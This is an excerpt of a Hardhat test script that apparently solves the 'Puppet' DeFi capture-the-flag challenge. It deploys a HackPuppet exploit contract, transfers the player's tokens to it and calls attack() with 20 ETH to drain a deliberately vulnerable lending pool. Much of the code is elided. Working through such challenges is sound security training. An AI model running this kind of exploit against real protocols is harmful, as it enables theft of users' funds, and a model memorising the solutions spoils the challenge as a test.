...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    // doenst work because must be done in 1 transaction from attacker (attack())
    ...
    const HackFactory = await ethers.getContractFactory(
      "contracts/puppet/solution/HackPuppet.sol:HackPuppet"
    );

    this.hack = await HackFactory.deploy(
    ...
    await token
      .connect(player)
      .transfer(this.hack.address, PLAYER_INITIAL_TOKEN_BALANCE);

    await this.hack.attack({ value: 20n * 10n ** 18n });
  });
